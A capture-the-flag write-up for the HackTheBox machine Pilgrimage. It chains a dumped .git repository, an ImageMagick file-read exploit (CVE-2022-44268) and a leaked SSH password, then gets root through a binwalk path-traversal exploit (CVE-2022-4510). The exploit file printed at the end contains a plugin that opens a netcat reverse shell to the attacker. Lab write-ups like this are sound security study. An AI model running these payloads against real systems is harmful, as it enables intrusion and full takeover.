---
layout: post
title: Pilgrimage - HackTheBox
categories:
- HackTheBox
tags:
- LFI
- Path Transversal
- Binwalk
- Magick
- Git Dump
- Sqlite
- inotifywait
- Linux
- CVE-2022-44268
- CVE-2022-4510
date: 2023-10-02
description: Pilgrimage is a hackthebox machine that has a website to shrink images. Running gobuster we found a git repository and we extract all the code used in the website. Inside the retrieved repository we have a binary called magick that is used to shrink images, however it has a vulnerable version. The version in question has a Local File Inclusion vulnerability that allows the attackers to read files. After reading a sqlite database file we get ssh credentials. Inside the system we found a script that analyses the files submitted in the website for malware. However the script use a vulnerable version of binwalk which gives us a shell as root. 
summary: Pilgrimage is a hackthebox machine that has a website to shrink images. Running gobuster we found a git repository and we extract all the code used in the website. Inside the retrieved repository we have a binary called magick that is used to shrink images, however it has a vulnerable version. The version in question has a Local File Inclusion vulnerability that allows the attackers to read files. After reading a sqlite database file we get ssh credentials. Inside the system we found a script that analyses the files submitted in the website for malware. However the script use a vulnerable version of binwalk which gives us a shell as root. 
cover:
  image: images/machine_img.png
---


## Recon

Port 80 and 22 are the only ports open to use. Lets explore the http port.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0

```

### Hosts File

Port 80 redirects us to the domain `pilgrimage.htb` so we add it in the `/etc/hosts` file.

## Foothold

The web application running seems to be a image shrinker. It accepts an image as input and then give you the shrinked version as well as the name of the file in the dashboard. However we couldn't find a template injection vulnerability.

We runned gobuster to find other possible paths and we find a .git directory.

```shell
$ gobuster dir -u http://pilgrimage.htb -w ~/SecLists/Discovery/Web-Content/big.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pilgrimage.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/w0rth/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/09/28 23:00:30 Starting gobuster in directory enumeration mode
===============================================================
/.git                 (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/]
/.htpasswd            (Status: 403) [Size: 153]                                  
/.htaccess            (Status: 403) [Size: 153]                                  
/assets               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/assets/]
/tmp                  (Status: 301) [Size: 169] [--> http://pilgrimage.htb/tmp/]   
/vendor               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/vendor/]

```

For the .git directory we found a tool called [git-dumper](https://github.com/arthaud/git-dumper) that takes a .git endpoint from a website and dumps everything. We run the tool  `git-dumper http://pilgrimage.htb/.git/ .` and suprisingly we get all the code from the website!

Guess it is a white box CTF :)

Inside .git/logs/HEAD we have : `root <root@pilgrimage.htb> 1686132708 +1000   commit (initial): Pilgrimage image shrinking service initial commit`
It seems like we can't obtain any information about the repo with the files we extract. We only know that the binary used to shrink images is magick.
Looking at the binary version of magick `./magick -version` we obtain the verison: `ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org`. Before trying to find a exploit for that version we look at the code to find vulnerabilities.

All the sql queries executed have parameters which protect against SQL injection, in the login and register. We know this because the developers used the method "prepare" with question marks before executing the query: `$stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");`.

The only surface of attack is the upload image to shrink. 
Once they receive a POST request in the index.php the image uploaded is validated. Its mimetype, dimension and size are validated using a bulletproof function called "upload". If its a valid image, they will generate a unique ID to store the image in the filesystem and use it in the command to shrink: `exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);`. However they have a problem. They do not validate the name of the image and its used straight in the command. Once it finishes it will store this information in the database associating the user to the image.

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
      header("Location: /?message=" . $upload_path . "&status=success");
    }
    else {
      header("Location: /?message=Image shrink failed&status=fail");
    }
  }
  else {
    header("Location: /?message=Image shrink failed&status=fail");
  }
}
```

Here we have two paths, first we can find an exploit to pass into the magick command and leverage the vulnerability. Second we can try to pipe commands and try to get a shell at the target machine. However its harder because they do not give any output to use beside the final upload path.

For the version we have the following exploits:
- https://www.exploit-db.com/exploits/51261
- https://github.com/voidz0r/CVE-2022-44268
- https://github.com/Sybil-Scan/imagemagick-lfi-poc
- https://github.com/entr0pie/CVE-2022-44268

The vulnerability presented in this version is a LFI(Local File Inclusion) which can read the contents of any file if magick has permission to read. The CVE-2022-44268 arises due to the mishandling of textual chunks within PNG files. Lets use the poc `https://github.com/voidz0r/CVE-2022-44268` (It is required to install png python package: `pip install pypng`).
Since it is time consuming to do all the steps when we want to read a file, we create the following script.

```python
import requests
import sys
import subprocess

# Write the shrunk file
file_id = sys.argv[1]
response = requests.get(file_id)
file = open("file.png", "wb")
file.write(response.content)
file.close()


# Get the Raw profile data
p = subprocess.run(["identify", "-verbose", "file.png"], stdout = subprocess.PIPE, 
        stderr = subprocess.PIPE)

raw_profile_data = str(p).split("Raw profile type:")[1].split("\\n\\n")[1].replace("\\n", "")#.split("\\n")
print(bytes.fromhex(raw_profile_data).decode())
```

Our technique works as follows:
1. Generate an image with the payload: `python3 CVE-2022-44268/CVE-2022-44268.py <file_here>`
2. Submit output in pilgrimage home page
3. Get the shrink link in: http://pilgrimage.htb/shrunk/651a87a32f890.png
4. Extract the file contents: `python3 get_file_info.py http://pilgrimage.htb/shrunk/651a87a32f890.png`

Looking at /etc/passwd we can see that we have one user: `emily:x:1000:1000:emily,,,:/home/emily:/bin/bash`
So, the next step is to find the password for it. Looking into the register.php we know that the application registers the users using a sqlite database stored as a file `  $db = new PDO('sqlite:/var/db/pilgrimage');`. Lets try to read the database and see if we can extract information from it.
Doing the previous explained process we get some errors, so we used [cyberchef](https://gchq.github.io/CyberChef/) with the option "from hex" and paste the all the hex characters. We extracted a password for the user emily: `abigchonkyboi123`. Trying it in the ssh `ssh emily@10.10.11.219` we get a shell and user flag!

## Privilege Escalation

Running linpeas we notice a strange script: `/usr/sbin/malwarescan.sh`. The bash script is running in a process as root and it seems like its listening the directory of `/var/www/pilgrimage.htb/shrunk/ ` for new files. This is done by `inotifywait` and it has a flag `-e created` which means that is only watching for created files. Then it runs `binwalk -e` in order to extract files from the image in order to find malware. Since root is running binwalk everytime a new file is crated, we can used this to escalate into root.

```shell
$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done

```

Looking for binwalk vulnerabilities we found the [CVE-2022-4510](https://nvd.nist.gov/vuln/detail/CVE-2022-4510). The vulnerability is a path transversal that can be exploited by sending crafted PFS filesystem files through the flag `-e` of binwalk. Since `malwarescan.sh` uses the flag `-e` in the binwalk command we have all the conditions for this vulnerability.

In the [article](https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/) they explain in more detail how this vulnerability can be leverage to execute commands. However we used an [exploit](https://www.exploit-db.com/exploits/51249) from exploit database. 
The first thing we do, is start a netcat listener using the port 1234 for example. Once we send the exploit to the target machine, we go to the directory `/var/www/pilgrimage.htb/shrunk/` and execute `python3 /tmp/51249.py /tmp/source.png <IP> <PORT>` where IP is our ip address, PORT is the port listening using netcat and source.png is a random image that we sent to the remote machine. The exploit will create a image `binwalk_exploit.png` containing the exploit.

```shell
$ cat binwalk_exploit.png 
PNG

IHD2/tEXtjust for test!Գ
                        IDATx


123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~6?IENDB`PFS/0.9../../../.config/binwalk/plugins/binwalk.py4.import binwalk.core.plugin
import os
import shutil
class MaliciousExtractor(binwalk.core.plugin.Plugin):
    def init(self):
        if not os.path.exists("/tmp/.binwalk"):
            os.system("nc 10.10.14.123 1234 -e /bin/bash 2>/dev/null &")
            with open("/tmp/.binwalk", "w") as f:
                f.write("1")
        else:
            os.remove("/tmp/.binwalk")
            os.remove(os.path.abspath(__file__))
            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "__pycache__"))
```
After a couple of seconds we get a shell as root.